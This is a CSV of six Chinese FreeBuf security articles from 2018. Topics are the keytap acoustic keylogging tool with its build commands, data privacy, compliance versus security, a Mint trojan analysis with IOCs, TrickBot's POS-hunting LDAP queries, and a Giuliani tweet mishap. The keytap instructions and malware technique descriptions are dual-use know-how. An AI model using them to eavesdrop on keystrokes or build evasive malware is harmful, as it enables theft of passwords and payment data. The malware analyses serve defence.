author,link,published,text,title
secist,,2018-12-18,"前言kbd-audio项目是一系列用于捕获和分析音频数据的命令行和GUI工具的集合。其中我认为最有意思的一款工具是keytap，它可以通过麦克风来捕获和分析键盘的输入，从而猜测出按键内容。有关keytap的更多信息，可以参阅以下博文及演示视频：Keytap: description and some random thoughts构建说明相关依赖SDL2 – 用于捕获音频和打开GUI windows libsdlFFTW3 – 一些辅助工具执行傅里叶变换（Fourier Transformation）fftwLinux &amp; Mac OSgit clone https://github.com/ggerganov/kbd-audiocd kbd-audiogit submodule update --initmkdir build &amp;&amp; cd buildcmake ..makeWindows(todo, PRs welcome)工具集record-full将音频录制到磁盘上的原始二进制文件./record-full output.kbdplay-full播放通过record-full捕获的录制内容./play-full input.kbdrecord仅在键入时录制音频。用于收集keytap的训练数据./record output.kbdplay播放通过record创建的录制内容./play input.kbdkeytap通过麦克风音频实时检测并捕获按下的键。使用record捕获的训练数据。./keytap-gui input0.kbd [input1.kbd] [input2.kbd] ...Live demo（需要启用WebAssembly pthreads和SharedArrayBuffer）keytap2（正在开发中）通过麦克风音频实时检测并捕获按下的键。使用关于语言的统计信息（n-gram频率）。无需训练数据。recording.kbd输入文件必须通过record-full生成，并包含将要分析的音频数据。n-gram.txt文件必须包含相应语言的n-gram概率。./keytap2-gui recording.kbd n-gram.txt反馈如果你对该工具有任何的疑问或建议，欢迎在此处留下你的评论。 *参考来源：GitHub，FB小编secist编译，转载请注明来自FreeBuf.COM",kbd-audio：通过麦克风来捕获和分析键盘输入的工具
GEETEST极验,,2018-12-17,"前言过去一年，数据泄漏事件频发，从外卖app、快递到酒店，详细到姓名、手机号码、地址、开房记录的信息，强烈的刺激着公众的神经。而随着我们迈入大数据时代，指纹、面部特征、语音也被纳入信息收集及盗取利用的范畴。在今年1月份，印度10亿公民身份数据库Aadhaar被曝遭网络攻击，该数据库除了名字、电话号码、邮箱地址等之外还有指纹、虹膜记录（虹膜识别技术是基于眼睛中的虹膜进行身份识别）等极度敏感的信息。这些比你的身份证还全面、精确的数据，若被别有用心的人加以利用，后果极为严重。在这样的一个大数据时代，我们的数据与隐私该何去何从呢。一、隐私数据被过度收集上周，中消协对100款App开展了隐私政策测评工作。结果显示，多达91款App存在涉嫌过度收集或使用用户信息的问题。1. 基本信息被过度收集企业出于“多多益善”的心态，对用户数据持续越位抓取，修图App要获取你的地理位置，购物App需开启录音权限，非游戏类APP越位获取访问联系人权限。当然，他们也会征求你的同意，可一旦你拒绝了这些请求，就不能使用该App，可以说是相当霸道。只有唯一“同意协议”选项的隐私政策2. 社交数据被大量收集你在不断创造新的数据。百度搜索资料，高德地图上查找地址、路线，微信聊天创造了文字记录，淘宝购物留下了交易数据。系统再根据这些海量数据，了解性格偏好，形成人物画像。我们自己看自己时还会存在偏差，但数据不会骗人，最后系统会比你自己还懂你。某app隐私协议二、数据的商业化应用数据被收集后，不愁没有用武之地。企业对数据最常见的有三种用途：一是精准营销，优化广告推荐。二是作为研究样本。人工智能研究需要大量数据，美颜app的人像照片，可作为人脸识别样本；语音聊天内容，构成声纹识别的样本。三是跟第三方营销推广平台合作，通过提供、贩卖数据赚钱；常见的如，你用浏览器A搜索猫粮的内容，之后登陆电商平台B，马上就会出现猫粮的购买推荐。就是因为A浏览器将你的数据提供给了B平台。某app隐私协议至于转让、贩卖信息，可以最近一直在舆论风口的Facebook为例来看。上半年Facebook被爆出，将部分数据转让给“剑桥分析公司”，而该公司通过研究推文“点赞”，了解用户偏好，为政治选举提供建议，并曾帮助特朗普赢取美国大选。且据外媒最新消息，内部文件显示，Facebook确实曾考虑将用户的隐私数据对第三方进行销售。至于不重视用户隐私有多大影响呢，Facebook股价18.96%的下跌给企业们一个参考。三、黑产对数据的盗取和贩卖对于黑产来说，大型互联网公司就是一顿肥美的大餐,他们想尽办法去攻破其数据库。目前主要的数据盗取途径包括：内部员工泄漏、黑客入侵数据库、恶意爬虫等，另外，淘宝卖家，快递点，也是信息泄漏的高频区域。信贷公司、诈骗集团、薅羊毛的黑产人员是这些信息主要买家。在暗网上，有众多明码实价售卖的隐私信息数据包，为了隐蔽性一般以比特币为交易货币，而隐私数据也极其廉价，数亿的详细个人数据往往只需要40万人民币左右。由于学籍信息泄漏去年6月发生的“徐玉玉”案还没多，今年7月份暗网又有了“浙江省1000万条学籍信息”，如此精准、详细的信息被诈骗人员掌握，意味着我们面临的骗局会越来越难以识破。四、AI时代的隐私战“数据商业化”和“隐私保护”注定是一场愈演愈烈的战争，随着AI技术的发展这场战争可能会进入白热化阶段。1. 无死角通信监听据斯诺登披露的“棱镜门项目”描述，美国政府正面向大众，展开一个无差别的监视项目。斯洛登向公众披露，NSA（美国国家安全局）在全球建了很多信息拦截点，只要在拦截范围内的信息就会被自动提取通讯内容，包括通话记录、邮件内容、银行卡号甚至密码。而且该系统可以预先设置关键词，在未来匹配到对象时候，就能立即搜索目标，这相当于监控警报。2. 智能家居的潜在陷阱智能家居和伴学机器人如今越来越火，而它们在方便你的同时，也将你的大量隐私至于危险境地。联网的家居清楚记录你的作息时间，机器人帮你监督孩子学习的同时，也可能帮助黑客监控着你的家庭，届时，你的家可能也不再是一个完全安全、放松的场所。3. “天网”恢恢，疏而不漏最近亚马逊正在给警方推销系统Rekognition——亚马逊产品介绍资料显示，Rekognition可以监控“团体照片、拥挤人群以及机场等公共场所中的所有面孔”，也就是可以帮助警方跟踪任何一个人。不难想象，当无人机、卫星和街边摄像头组成的天眼系统，与人脸识别技术结合后，电影《黑镜》中描绘的政府可以实时监控任何人的情境也不远了。五、拒绝“隐私换便利”虽然我们确实会进入一个越来越“没有隐私”的时代，也有可能“从没有人会去阅读冗长的用户协议”，但“隐私换便利”的论断无疑是伪命题。隐私是一项基本的人权，无论是对企业、个人还是政府，都应该重视它。1. 政府隐私法规的健全对于隐私数据被贪婪不加节制的获取，政府已经采取行动。6月1日新出台的《网络安全法》，首批打击目标就是黑客、数据交易公司，互联网公司“内鬼”。根据最高法、最高检的司法解释，“非法获取、出售或者提供行踪轨迹信息、通信内容、征信信息、财产信息50条以上”，即属情节严重，可入刑。相信通过行政性的惩罚，可以警示企业去审视自己的行为，防止此类行为的再次出现。2. 企业对数据的保护一方面企业对用户隐私的态度应更加审慎，严格按照《个人信息安全规范》规定，对个人信息的收集应有明确目的，不得超出产品功能相关目的；另一方面，对于已有数据应该做好安全加密工作，从用户登陆到后台数据库层层防护，对异常情况及时监控，确保数据不被非法盗取。对数据和商业贪婪的克制，可能更利于和用户培养信任感，实现长线的收获。3. 个人对数据的态度与信息安全最密切相关的还是个人，目前我们对信息的重视程度不够。最基本的在使用应用前阅读隐私条款，对各类从产品的安全性时刻保持警惕，有甚者可以学习下加密技术，不要因为科技的发展，丢掉了自己的自由。*本文作者：GEETEST极验，转载请注明来自FreeBuf.COM",10亿公民指纹泄漏、亚马逊人脸跟踪系统上线，2018隐私保护告急
Freddy,,2018-12-14,前言2018年，5G标准、中芯案件，使得技术博弈、话语权博弈持续发酵，深刻改变着数字经济的利益格局和安全格局。GDPR落地已经半年有余，我国《网络安全法》也正式实施一年了，全球范围内围绕网络安全、数据保护等重要制度立法、执法和司法活动都在积极推动。但是一部分企业在合规过程中往往被一叶障目，以为合规了数据就安全了，真的是这样吗？概述企业中的开发部门和网络安全部门的责任划分、目标和动机有着很大的不同，不可避免地会产生诸多冲突。在新应用、新功能的开发过程中，企业一般通过引入代码扫描工具来确保安全，以便在上线之前发现漏洞并进行修复。但是随着企业合规需求的不断上升，对于一些企业而言，网络安全建设的重心转向了如何满足法律法规的监管，这就有可能出现本末倒置引发的问题。这里举一个来自于电子支付领域的典型例子。对于存储了用户财产信息的支付系统来说，应当以确保所在目标系统和数据的机密性、完整性和可用性为前提。但是合规性需求一来，对于质量安全评估员（QSA）而言获得支付卡行业数据安全标准（PCI-DSS）认证就变成最高优先级事件了。比如2008年Heartland支付系统数据泄露的例子，虽然有点老，但是说明的问题很典型。就是到了现在，它还是有史以来最大的数据泄漏事件之一，当年超过1亿人的个人信息和支付卡数据被盗，超过600家公司受到影响，损失总额达数亿美元。Heartland符合PCI-DSS，在发现违规行为的两周前刚刚通过合规审计。造成该事件的原因是攻击者通过SQL注入漏洞成功渗透到系统内部，并非是零日攻击或APT。漏洞所在模块是用于处理支付卡数据，因此不在PCI QSA的审核范围内。合规与安全建设合规计划与安全建设应当作为两条轨道同时进行，合规计划不应管理安全计划的运作。任何行业标准下的要求应当作为组织的安全底线，而不是终极目标。合规团队的目标是满足最低安全标准，这些标准由第三方定义，不会考虑每个企业的独特业务背景，只是推进某种业务功能而不是强制保证全面安全。那么，企业开发流程中的安全建设该如何适应？每个开发生命周期都必须根据业务需求、开发节奏和使用的技术进行自定义设计，以下五点可以作为参考：一、光扫描是不够的，还需要持续跟踪和修正要提升开发流程安全性，光扫描和报告漏洞是不够的，必须要有能够在整个开发周期中进行全面安全管理的一套工具/系统，支持提供以下信息：有关开放漏洞的最新统计数据；统计数据的时间窗口；漏洞的历史趋势；安全缺陷密度统计和趋势。该工具应当支持集成基础架构漏洞管理报告，让高级管理人员明确了解整体风险，并了解具体针对哪些领域。二、推进SDLC中的安全流程标准化标准化保证每个开发阶段安全性的必要条件。针对软件开发生命周期（SDLC）而言，团队是否遵循每年一次的大规模部署的瀑布流程，或者包含持续集成/持续部署通道，这些因素并不是最重要的。每个人都知道会进行安全测试，比如静态分析/检测并修复任何已识别的漏洞。所以要注意的一点是，SDLC还必须包括安全维护这一环节。一旦推向生产环节，项目往往会冻结，有时候开发人员不会参与下一个版本的工作。在源代码中发现新漏洞时该怎么办？必须有一个持续的版本维护流程来确保安全。三、使用经过验证的技术基于知名和成熟的技术来构建标准化的安全流程可以让安全团队更加专注和专业。分析师熟悉语言语法能够协助开发人员，针对特定语言和版本定制自动化工具。建立第三方库和框架的索引可以更方便地进行管理，在发生问题时快速急行补救，并可降低使用流氓库的可能性。四、上下一心如果高层管理人员三心二意，那么就算是世界上最好的安全计划也无计可施，安全团队要向管理人员和利益相关方传达安全开发流程的好处，能够带来哪些绩效上的提升。五、开发人员教育在开发时引入漏洞是源代码出现问题的根源，相当一部分比例的计算机科学专业毕业生从未接触过最基本的安全实践准则或原则。要解决这个问题需要在安全发展计划中纳入继续教育这一块的内容而且应当是从全面的安全基础教育开始，而不是那种蜻蜓点水式的培训。形式上可以是午餐会、学习小组、现场活动等，当他们深入了解代码阶段引入的各种问题让安全团队多么头大时，代码质量就会相应提升。*参考来源：darkreading，Freddy编译整理，转载请注明来自 FreeBuf.COM。,合规就代表安全了吗？那可不一定
安全豹,,2018-12-12,0×1 前言近期，金山毒霸安全实验室通过“捕风”威胁感知系统的数据监控，发现一款名为“西瓜看图”的恶意软件。该软件主要通过“荒野行动电脑版”、“抖音电脑版”等虚假下载器进行传播。该虚假器运行后，实际安装的是“蜻蜓助手”安卓模拟器，并由“蜻蜓助手”推广安装“西瓜看图”木马远控软件。该软件通过云控手段，进行主页劫持、图标推广、软件推广、广告弹窗等恶意行为。由于该木马会在用户磁盘中创建“Mint”的目录，保存云控插件，所以我们特此命名为“Mint”木马。0×2 传播和推广Mint木马的传播路径：虚假下载器运行界面：该虚假下载器无签名，无版本信息，点击“立即安装”会下载运行“蜻蜓助手”，而不是用户预想的“荒野行动网易版”。“蜻蜓助手”安装完毕后，会默认勾选“西瓜看图”（Mint木马家族的母体），用户如稍有不慎点击“立即启动”就会被植入木马软件。0×3 模块和流程功能模块Mint 云控木马主要为6个功能：信息收集，广告弹窗，软件推广，图标推广，主页劫持，更新变异。其中，广告弹窗，软件推广，图标推广和主页劫持的具体内容，均由云端进行配置，通过下发文件的形式，在本地解析执行；更新变异，则保证云控载体不断更新和变形，以躲避杀软查杀和更新功能。功能模块图：信息收集，主页劫持，广告等相关URL信息：执行流程Mint木马利用傀儡进程注入、BHO机制（参考https://en.wikipedia.org/wiki/Browser_Helper_Object）、UPX加壳、数据加密、服务劫持等技术，使整个执行过程具有很高的隐蔽性。执行流程：0×4 影响和分布通过“捕风”威胁感知系统的监控到，Mint木马家族8月中旬开始爆发；9月中旬活跃达到峰值，感染用户量达5W/天；10月之后活跃降低，近期又逐渐活跃起来。受感染的用户中，占比最多的是1123变种（71.23%），其次是1122变种（17.11%）（因为变种众多，为了方便起见，我们暂且用文件名后面的版本号表示变种名称。如url包含的文件名XiGuaViewer_1123.exe，表示1123变种）变种分布图：0×5 细节分析环境检测Mint母体通过注册表、文件和进程关系，检测是否沙箱/虚拟机/调试/杀软环境，是否浏览器或下载器启动；不是的话才执行恶意代码，否则只调起安装界面。沙箱/虚拟机环境检测：调试工具和安全监控软件的检测名单：配置下拉云控载体解密模块配置文件Ver.ini：获取到解密后的内容：整理出模块配置文件Ver.ini各字段的含义如下：接着云控载体进行字段解析并更新插件模块和推广配置文件，将核心模块core.dat解密并注入到傀儡进程中执行：核心模块core.dat会解密推广配置文件settings.xml，并执行相应的推广劫持操作：更新变异云控载体从模块配置文件Ver.ini中获取最新载体的下载地址（http://down.om*******.com/Lsvr.dat），保存为PsLangue.dat，然后解密还原成PE文件，复制到系统目录下，随机命名，并通过劫持wuauserv系统服务的方式，实现自更新和启动。主页劫持（1）首先，Mint母体（“西瓜看图”）下载http://plg.*******.com/plg.dat，并执行；plg.dat 从资源中释放两个dll（分别是32位和64位），用regsvr32.exe注册dll文件。通过BHO机制劫持IE浏览器主页为http://uee.me/q8gn（跳转后最终为2345网址导航）。通过BHO机制劫持IE浏览器主页为http://uee.me/q8gn（跳转后最终为2345网址导航）。（2）其次，在core.dat核心功能模块中，通过修改注册表的方式篡改用户主页：settings.xml中篡改页的配置信息：图标推广settings.xml中图标推广的配置信息：广告弹窗settings.xml中广告弹窗的配置信息：软件推广settings.xml中软件推广的部分配置信息：我们发现，在配置文件中，主页篡改、图标推广、广告弹窗和软件推广，除规避“北上深广”一线城市外，还规避了昆山和马鞍山。其他由于Mint木马家族变种繁多，部分云控模块已停用，且由于篇幅和时间所限，这就不多啰嗦啦。0×6 安全建议不安装来源不明的可疑软件；默认勾选框千万千万千万要小心；安装杀毒防护软件并开启主防功能；定时查杀和更新系统。附录IOC087E97C0A106A4184E61E743664F87649FFA36F6B4F2690490851E25390A07B80BA931AE318DC6F02D1D660D6A2202AE7AC1413CC61E997C4FF65E7262D3D173F9BA5281CF00E096B608C1825C1D60CC73192ADE5AA1569BE1FD5A9C4758003A98A9C4A108E10E758861600EB1F6F511D4667E997D50A4DFECBF2C9E4884E4359486BBBF6A9DE9CF2BE8C75347AE32F935BE3B8495074A4CBAE724572FA90ED431C3581C6094E043F4D2492D099977171DCBB119B1BA07F7718E9E31D014C817B493D07BF7857E4851356016DAD13BCA439EE7F2493D7B453442AC31AA3C5DCD16181EA5452F547430E1426AE9027D04http://down.tw******.cn/XiGuaViewer_1121.exehttp://down.vx******.com/XGViewer_1093.exehttp://down.wi******.com/XiGuaViewer_1133.exehttp://mo.******.net/mo/setup.cr173.386472.exehttp://coll.******.com:9804/supp.aspxhttp://ver.******.com/Ver.inihttp://cfg.******.com/config.inihttp://down.om******.com/Lcore.dathttp://down.om******.com/Hcore.dathttp://down.om******.com/Lsvr.dathttp://down.om******.com/Hsvr.dathttp://down.um******.com/Discontor32.xmlhttp://down.um******.com/Discontor64.xmlhttp://plg.******.com/PopNews.dat参考链接BHO：https://en.wikipedia.org/wiki/Browser_Helper_Object*本文作者：安全豹，转载请注明来自FreeBuf.COM,Mint木马变种泛滥，伪装“抖音电脑版”肆虐网络
Alpha_h4ck,,2018-12-10,前言Trickbot这款银行木马涉及到了多种网络攻击活动，但它主要针对的是银行机构的网络系统。但是现在，TrickBot的更新版本将能够针对自助提款服务以及POS机设备来发动攻击，并窃取目标用户的储蓄卡及信用卡支付数据。概述近期，TrickBot的恶意活动变得越来越频繁了，而且它还可以攻击类似Microsoft Outlook、Chrome、Firefox、IE和Edge等浏览器或者App，并从中窃取用户密码和其他的敏感数据。除此之外，这款恶意软件的开发者仍在持续给TrickBot增加新的功能，比如说引入更强大的代码注入技术来绕过安全检测，引入反分析技术并禁止目标计算机运行安全工具。目前识别到的TrickBot样本已经支持POS服务攻击功能了。这个新添加的POS感染模块名为psfin32，它的作用跟此前攻击所使用的网络域名收集模块非常类似。研究人员在分析过程中发现，模块代码中包含了跟POS相关的术语，而且代码使用了LDAP查询请求来访问活动目录服务（ADS）并识别目标网络中的POS服务。LDAP查询&amp;TrickBot感染过程TrickBot主要使用LDAP查询来在Global Catalog中搜索包含了下列子字符串（跟POS服务相关）的设备：*POS**LANE* *BOH* *TERM**REG* *STORE* *ALOHA* *CASH* *RETAIL* *MICROS*它使用了不同的LDAP查询来搜索这些子字符串，如果查询请求无法获取到预期的响应信息，也就是查询结果，那么它将会查询其他的账号或者对象。当Trickbot从目标设备上获取到了所需信息之后，它将会把数据存储在预配置文件中，并通过POST链接将收集到的数据传回远程C2服务器。如果C2服务器无法访问，它将会返回“Dpost servers unavailable”，否则它将会发送“Report successfully sent”。因此，研究人员提醒广大企业及用户，不要打开任何可疑邮件以及附件文档，以防止受到此类攻击的威胁。* 参考来源：gbhackers，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM,升级版TrickBot将支持获取信用卡储蓄卡数据的功能
lifeisaloop,,2018-12-07,之前，日本新晋网络安全部长樱田义孝表示自己从来没用过电脑，甚至连USB是什么都无法解释清楚，引起日本国内一片哗然，也让吃瓜群众掩面而笑。本站也发布过一篇报道，笔者摘取部分内容回顾一下。作为现任的网络安全部长，樱田义孝在11月14日日本国内答辩现场的回答却让人震惊：电脑相关的操作我一般都指示职员来做，所以自己并没有用过电脑。问到关于USB的问题时：他的回答：他的回答：不过毕竟这是别国的内政，我们作为群众也只能看看热闹，但是美国人似乎要抬一把国际政治舞台上一直充当美国马前卒的日本。。。根据国际知名科技站点TechCrunch贴出来的一则小故事，看得出特朗普的网络安全顾问其实也不怎么懂网络安全。最近纽约市前任市长、特朗普总统现任网络安全顾问鲁迪·朱利安尼（Rudy Giuliani）也被打上了“不懂的技术政治人物”的标签。朱利安尼在一条推文里忘了在句号后面加空格，而上下句的首尾单词恰好连成了一个批评特朗普的网站 。这本来已经很尴尬了，不过，他现在又声称“Twitter 让某个人在我的文本中插入了一则令人厌恶的反总统信息”，这着实让他的网络智商在大家眼中跌成了负数。搞不清楚眼前状况的朱利安尼抓住了一根救命稻草，即声称 Twitter 内部存在明显的反共和党偏见——特朗普和其他共和党人经常拿着个说事 ，尽管他们毫无证据 。“他们（Twitter 员工）不是职业川黑就鬼了。”朱利安尼补充道。Twitter让某个人在我的文本中插入了一则令人厌恶的反总统信息。我后来还有一次句号之后没加空格就没出这种事。他们不是铁杆特朗普反对者就鬼了。《时代》杂志也差不多。请保持公正！！— Rudy Giuliani (@RudyGiuliani) 2018年11月5日这个解释倒是简单。我们在这里再次重申，他现在的职务是白宫网络安全顾问。穆勒提出控诉趁着总统参加 G-20. 在 7 月份的时候，他也曾在总统前往赫尔辛基之前起诉那些永远不会来到这里的俄罗斯人。早一点或晚一点都可以起诉啊，简直是失控了！快来个人管管，好吗？— Rudy Giuliani (@RudyGiuliani) 2018年11月30日朱利安尼最初在 11 月 30 日发布的推文（如上）没有在句子之间加上空格，从而创建了一个指向G-20.in的超链接。一位眼尖的群众——据BBC报道，他是一位驻亚特兰大的营销总监，名叫杰森·维拉兹克（Jason Velazquez）——点进了链接，并且发现它是空白的，于是他很快注册了这个域名，并创建了一个网站，在上面写上了朱利安尼所说的“一则令人厌恶的反总统信息”。「特朗普是美奸卖国贼」：出现在朱利安尼推文中的 G-20.in 网站。“当我意识到那个网址还可用的时候，我的心跳开始加速。我记得当时心想：‘这个家伙，朱利安尼，根本不懂是咋回事。’”委拉斯开兹在接受 BBC 采访时说，“我迅速上传了文件，在 Twitter 上公布了自己做的事，然后离开了我的公寓。”朱利安尼最初的推文被媒体广泛报道，但他对这个话题做出的荒谬回应又让该网站得到了更多的媒体曝光。截至太平洋标准时间 12 月 4 日 22 时 40 分，朱利安尼的两条推文仍然没有被删除。不过，从积极的一面来说，朱利安尼似乎搞清楚了如何通过回复之前的推文在 Twitter 上进行跟帖。在此之前，朱利安尼也曾上演过另一幕 Twitter 喜剧，他对自己一则关于特朗普前任律师迈克尔·科恩（Michael Cohen）达成认罪协议的推文进行了跟帖，但内容却很奇怪（如下）：Kimim ° has f— Rudy Giuliani (@RudyGiuliani) 2018年11月30日这则推文跟特朗普在去年发出的“covfefe”拼写错误倒是相映成趣。*本文转载自techcrunch.cn，lifeisaloop整理，转载请注明来源。,白宫网络安全顾问：听说日本网安部长没用过电脑，不知道USB是什么，你们以为我就懂网络安全了？
